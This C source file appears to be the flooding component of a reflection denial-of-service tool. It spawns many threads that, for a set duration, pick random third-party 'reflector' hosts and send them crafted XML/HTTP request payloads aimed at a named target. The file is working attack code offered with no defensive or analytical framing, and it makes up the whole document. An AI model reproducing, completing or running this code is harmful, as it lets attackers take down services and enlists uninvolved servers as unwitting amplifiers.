#include "xml.h"
#include "flood.h"
#include "vector.h"
#include "payload.h"
#include "socket.h"
#include "utils.h"

pthread_mutex_t main_mutex = PTHREAD_MUTEX_INITIALIZER;

static void* flood_worker(void* attack_data) {
  attack_t* attack = (attack_t*)attack_data;
  time_t end_time = (time(NULL) + attack->duration);

  #ifdef DEBUG
    printf("Starting worker for target -> %s\n", attack->target);
  #endif

  conn_t* conn = calloc(1, sizeof(conn_t));
  conn->client_port = 80;

  while(end_time > time(NULL)) {
    struct node* rand_reflector = vector_rand();
    if(rand_reflector != NULL) {
      pthread_mutex_lock(&main_mutex);
      char* payload_data = xml_http_request(attack, rand_reflector);
      conn->client_host = (char*)rand_reflector->host;
      pthread_mutex_unlock(&main_mutex);

      socket_t sock = socket_create(conn);
      if(sock > 0) {
        if(sock_write(sock, payload_data)) {
          sock_pseudorecv(sock);
        }
      }
      close(sock);
      free(payload_data);
    }
  }
  free(conn);
  #ifdef DEBUG
    printf("Thread exited at %ld\n", time(NULL));
  #endif
  
  return NULL;
}

void flood_start(attack_t* attack) {
  pthread_t workers[attack->threads];
  for (size_t i = 0; i < attack->threads; i++) {
    pthread_create(&workers[i], NULL, &flood_worker, (void*)attack);
  }
  for (size_t i = 0; i < attack->threads; i++) {
    pthread_join(workers[i], NULL);
  }
  pthread_mutex_destroy(&main_mutex);
}
